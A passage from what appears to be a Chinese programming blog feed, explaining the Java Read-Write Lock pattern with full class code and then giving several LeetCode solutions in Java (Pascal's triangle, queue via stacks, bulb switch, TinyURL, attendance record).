<td>表示读取线程的类</td>
</tr>
<tr>
<td>Data</td>
<td>可以读写的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
<tr>
<td>ReadWriteLock</td>
<td>提供读写锁的类</td>
</tr>
<tr>
<td>### Main类</td>
<td></td>
</tr>
<tr>
<td>Main类首先会创建一个Data类的示例。然后创建对该Data类实例执行读取操作的线程实例，以及执行写入操作的线程实例，并启动它们。</td>
<td></td>
</tr>
</tbody></table>
<p>这里启动了六个读取线程和两个写入线程。<br>Main类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Data data = <span class="keyword">new</span> Data(<span class="number">10</span>);</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> ReaderThread(data).start();</span><br><span class="line">		<span class="keyword">new</span> WriterThread(data, <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> WriterThread(data, <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Data类"><a href="#Data类" class="headerlink" title="Data类"></a>Data类</h3><p>Data类是可以执行读取和写入操作的类。</p>
<p>buffer字段是实际的读写对象char的数组。</p>
<p>lock字段保存的是该模式的主角ReadWriteLock实例。</p>
<p>构造函数会根据参数传入的长度来分配一个char数组，并初始化buffer字段，同时以字符“<em>”填满buffer，此处的“</em>”为初始值。</p>
<p>read方法执行读取操作。实际的读取操作是通过doRead方法执行的，而doRead方法夹在lock.readLock和lock.readUnlock之间。lock.readLock表示获取用于读取的锁，lock.readUnlock则表示释放用于读取的锁。</p>
<p>夹住doRead的地方使用了try…finally结构。这是为了确保在执行了readLock之后，不管doRead中发生了什么情况，lock.readUnlock都一定会被调用。</p>
<p>doRead方法用于执行实际的读取操作。该方法会创建一个新的char数组，来赋值buffer字段的内容，并返回newbuf。</p>
<p>doWrite方法用于执行实际的写入操作。该方法会以参数传入的字符c来填满buffer字段。</p>
<p>slowly方法用于辅助模拟耗时的操作，次数是sleep约50毫秒。<br>Data 类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> ReadWriteLock lock = <span class="keyword">new</span> ReadWriteLock();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span>[] buffer;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Data</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.buffer = <span class="keyword">new</span> <span class="keyword">char</span>[size];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; size;i++) &#123;</span><br><span class="line">			buffer[i] = <span class="string">'*'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">char</span>[] read() <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">		lock.readLock();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> doRead();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			lock.readUnlock();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">char</span>[] doRead() &#123;</span><br><span class="line">		<span class="keyword">char</span>[] newBuff = <span class="keyword">new</span> <span class="keyword">char</span>[buffer.length];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; buffer.length;i++) &#123;</span><br><span class="line">			newBuff[i] = buffer[i];</span><br><span class="line">		&#125;</span><br><span class="line">		slowly();</span><br><span class="line">		<span class="keyword">return</span> newBuff;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">slowly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread.sleep(<span class="number">50</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doWrite</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; buffer.length;i++) &#123;</span><br><span class="line">			buffer[i] = c;</span><br><span class="line">			slowly();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">char</span> c)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		lock.writeLock();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			doWrite(c);</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			lock.writeUnlock();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WriteThread类"><a href="#WriteThread类" class="headerlink" title="WriteThread类"></a>WriteThread类</h3><p>WriterThread类表示的是对Data实例执行写入操作的线程。构造函数的参数filter是一个字符串，程序会逐个去除该字符串中的字符，并write到data的实例中。<br>WriteThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WriterThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Data data;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String filler;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">WriterThread</span><span class="params">(Data data, String filler)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.data = data;</span><br><span class="line">		<span class="keyword">this</span>.filler = filler;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">char</span> c = nextChar();</span><br><span class="line">				data.write(c);</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">3000</span>));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">char</span> <span class="title">nextChar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">char</span> c = filler.charAt(index);</span><br><span class="line">		index++;</span><br><span class="line">		<span class="keyword">if</span> (index &gt;= filler.length()) &#123;</span><br><span class="line">			index = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> c;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ReadThread类"><a href="#ReadThread类" class="headerlink" title="ReadThread类"></a>ReadThread类</h3><p>ReadThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReaderThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Data data;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ReaderThread</span><span class="params">(Data data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.data = data;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">				<span class="keyword">char</span>[] readBuf = data.read();</span><br><span class="line">				System.out.println(Thread.currentThread().getName()+ <span class="string">" reads "</span> + String.valueOf(readBuf));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ReadWriteLock类"><a href="#ReadWriteLock类" class="headerlink" title="ReadWriteLock类"></a>ReadWriteLock类</h3><p>该类提供了用于读取的锁和用于写入的锁。<br>为了确保安全性，我们必须放置如下两种冲突。</p>
<ul>
<li>“读取”和“写入”冲突</li>
<li>“写入”和“写入”冲突</li>
</ul>
<p>由于不存在“读取”和“读取”冲突，所以我们无需对其进行考虑。<br>为了防止发生冲突，需要考虑下面四种情况：<br><strong>当线程想要获取用于读取的锁时……</strong></p>
<ol>
<li>如果有线程正在执行写入，则等待。</li>
<li>如果有线程正在执行读取，则无需等待</li>
</ol>
<p><strong>当线程想要获取想要写入的锁时……</strong><br>3. 如果有线程正在执行写入，则等待<br>4. 如果有线程正在执行读取，则等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadWriteLock</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> readingReaders = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> waitingWriters = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> writingWriters = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> preferWriter = <span class="keyword">true</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">readLock</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (writingWriters &gt; <span class="number">0</span> || (preferWriter &amp;&amp; waitingWriters &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">			wait();</span><br><span class="line">		&#125;</span><br><span class="line">		readingReaders++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">readUnlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		readingReaders--;</span><br><span class="line">		preferWriter = <span class="keyword">true</span>;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">writeLock</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		waitingWriters++;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (readingReaders &gt; <span class="number">0</span> || writingWriters &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			waitingWriters--;</span><br><span class="line">		&#125;</span><br><span class="line">		writingWriters++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">writeUnlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		writingWriters--;</span><br><span class="line">		preferWriter = <span class="keyword">false</span>;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Read-Write Lock 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>118. 杨辉三角</title>
    <url>/2018/09/05/LeetCode/leetcode-000118.%20%E6%9D%A8%E8%BE%89%E4%B8%89%E8%A7%92/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个非负整数 numRows，生成杨辉三角的前 numRows 行。</p>
<p><img src="https://huhansi.github.io/images/2020-03-02-000118-yanghuisanjiao.gif" alt="杨辉三角形"></p>
<p>在杨辉三角中，每个数是它左上方和右上方的数的和。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出:</span><br><span class="line">[</span><br><span class="line">     [1],</span><br><span class="line">    [1,1],</span><br><span class="line">   [1,2,1],</span><br><span class="line">  [1,3,3,1],</span><br><span class="line"> [1,4,6,4,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>第一行固定是1，那么就可以根据三角形的规律，求出N行来</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">		List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == numRows) &#123;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line">		List&lt;Integer&gt; one = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		one.add(<span class="number">1</span>);</span><br><span class="line">		result.add(one);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">			List&lt;Integer&gt; last = result.get(i - <span class="number">1</span>);</span><br><span class="line">			List&lt;Integer&gt; tmp = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">			tmp.add(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++) &#123;</span><br><span class="line">				tmp.add(last.get(j - <span class="number">1</span>) + last.get(j));</span><br><span class="line">			&#125;</span><br><span class="line">			tmp.add(<span class="number">1</span>);</span><br><span class="line">			result.add(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>232. 用栈实现队列</title>
    <url>/2018/09/05/LeetCode/leetcode-000232.%20%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>使用栈实现队列的下列操作：</p>
<ul>
<li>push(x) – 将一个元素放入队列的尾部。</li>
<li>pop() – 从队列首部移除元素。</li>
<li>peek() – 返回队列首部的元素。</li>
<li>empty() – 返回队列是否为空。<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MyQueue queue &#x3D; new MyQueue();</span><br><span class="line"></span><br><span class="line">queue.push(1);</span><br><span class="line">queue.push(2);  </span><br><span class="line">queue.peek();  &#x2F;&#x2F; 返回 1</span><br><span class="line">queue.pop();   &#x2F;&#x2F; 返回 1</span><br><span class="line">queue.empty(); &#x2F;&#x2F; 返回 false</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ul>
<li>你只能使用标准的栈操作 – 也就是只有 push to top, peek/pop from top, size, 和 is empty 操作是合法的。</li>
<li>你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。</li>
<li>假设所有操作都是有效的 （例如，一个空的队列不会调用 pop 或者 peek 操作）。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用两个栈来模拟一个队列</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	Stack&lt;Integer&gt; s1;</span><br><span class="line">	Stack&lt;Integer&gt; s2;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	s1 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    	s2 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    	s1.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (s2.empty()) &#123;</span><br><span class="line">    		<span class="keyword">while</span> (!s1.empty()) &#123;</span><br><span class="line">    			s2.push(s1.pop());</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> s2.pop();</span><br><span class="line">    	</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Get the front element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (s2.empty()) &#123;</span><br><span class="line">    		<span class="keyword">while</span> (!s1.empty()) &#123;</span><br><span class="line">    			s2.push(s1.pop());</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> s2.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> s1.empty() &amp;&amp; s2.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Stack</tag>
        <tag>queue</tag>
      </tags>
  </entry>
  <entry>
    <title>319. 灯泡开关</title>
    <url>/2018/09/05/LeetCode/leetcode-000319.%20%E7%81%AF%E6%B3%A1%E5%BC%80%E5%85%B3/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>初始时有 n 个灯泡关闭。 第 1 轮，你打开所有的灯泡。 第 2 轮，每两个灯泡你关闭一次。 第 3 轮，每三个灯泡切换一次开关（如果关闭则开启，如果开启则关闭）。第 i 轮，每 i 个灯泡切换一次开关。 对于第 n 轮，你只切换最后一个灯泡的开关。 找出 n 轮后有多少个亮着的灯泡。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 3</span><br><span class="line">输出: 1 </span><br><span class="line">解释: </span><br><span class="line">初始时, 灯泡状态 [关闭, 关闭, 关闭].</span><br><span class="line">第一轮后, 灯泡状态 [开启, 开启, 开启].</span><br><span class="line">第二轮后, 灯泡状态 [开启, 关闭, 开启].</span><br><span class="line">第三轮后, 灯泡状态 [开启, 关闭, 关闭]. </span><br><span class="line"></span><br><span class="line">你应该返回 1，因为只有一个灯泡还亮着。</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p><a href="https://blog.csdn.net/qqzj_bupt/article/details/53355362" target="_blank" rel="noopener">https://blog.csdn.net/qqzj_bupt/article/details/53355362</a></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">bulbSwitch</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(Math.sqrt(n));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>535. TinyURL 的加密与解密</title>
    <url>/2018/09/05/LeetCode/leetcode-000535.%20TinyURL%20%E7%9A%84%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>TinyURL是一种URL简化服务， 比如：当你输入一个URL <code>https://leetcode.com/problems/design-tinyurl</code> 时，它将返回一个简化的URL <code>http://tinyurl.com/4e9iAk</code>.</p>
<p>要求：设计一个 TinyURL 的加密 <code>encode</code> 和解密 <code>decode</code> 的方法。你的加密和解密算法如何设计和运作是没有限制的，你只需要保证一个URL可以被加密成一个TinyURL，并且这个TinyURL可以用解密方法恢复成原本的URL。</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用hashcode()</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Integer, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	<span class="comment">// Encodes a URL to a shortened URL.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">encode</span><span class="params">(String longUrl)</span> </span>&#123;</span><br><span class="line">        map.put(longUrl.hashCode(), longUrl);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"http://tinyurl.com/"</span> + longUrl.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decodes a shortened URL to its original URL.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">decode</span><span class="params">(String shortUrl)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> map.get(Integer.parseInt(shortUrl.replace(<span class="string">"http://tinyurl.com/"</span>, <span class="string">""</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>551. 学生出勤纪录 I</title>
    <url>/2018/09/05/LeetCode/leetcode-000551.%20%E5%AD%A6%E7%94%9F%E5%87%BA%E5%8B%A4%E7%BA%AA%E5%BD%95%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串来代表一个学生的出勤纪录，这个纪录仅包含以下三个字符：</p>
<ol>
<li>‘<code>A</code>‘ : Absent，缺勤</li>
<li>‘<code>L</code>‘ : Late，迟到</li>
<li>‘<code>P</code>‘ : Present，到场</li>
</ol>
<p>如果一个学生的出勤纪录中不超过一个’A’(缺勤)并且不超过两个连续的’L’(迟到),那么这个学生会被奖赏。</p>
<p>你需要根据这个学生的出勤纪录判断他是否会被奖赏。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;PPALLP&quot;</span><br><span class="line">输出: True</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;PPALLL&quot;</span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>判断是否同时有一个A并且和连续的三个A就行</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkRecord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> aNum = s.chars().filter(c -&gt; c == <span class="string">'A'</span>).count();</span><br><span class="line">		<span class="keyword">if</span> ((aNum &lt;= <span class="number">1</span>) &amp;&amp; (!s.contains(<span class="string">"LLL"</span>))) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>521. 最长特殊序列 Ⅰ</title>
    <url>/2018/09/05/LeetCode/leetcode-000521.%20%E6%9C%80%E9%95%BF%E7%89%B9%E6%AE%8A%E5%BA%8F%E5%88%97%20%E2%85%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个字符串，你需要从这两个字符串中找出最长的特殊序列。最长特殊序列定义如下：该序列为某字符串独有的最长子序列（即不能是其他字符串的子序列）。</p>
<p>子序列可以通过删去字符串中的某些字符实现，但不能改变剩余字符的相对顺序。空序列为所有字符串的子序列，任何字符串为其自身的子序列。</p>
<p>输入为两个字符串，输出最长特殊序列的长度。如果不存在，则返回 -1。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;aba&quot;, &quot;cdc&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解析: 最长特殊序列可为 &quot;aba&quot; (或 &quot;cdc&quot;)</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>两个字符串长度均小于100。</li>
<li>字符串中的字符仅含有 ‘a’~’z’。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>如果两个字符串长度不相同，A字符串大于B字符串，则A字符串不能通过B字符串删除某些字符得到，那么最长特殊序列的长度就是A的长度。<br>如果两个字符串相等的话，分两种情况：</p>
<ol>
<li>两个字符串相等，那么就没有最长特殊字符序列</li>
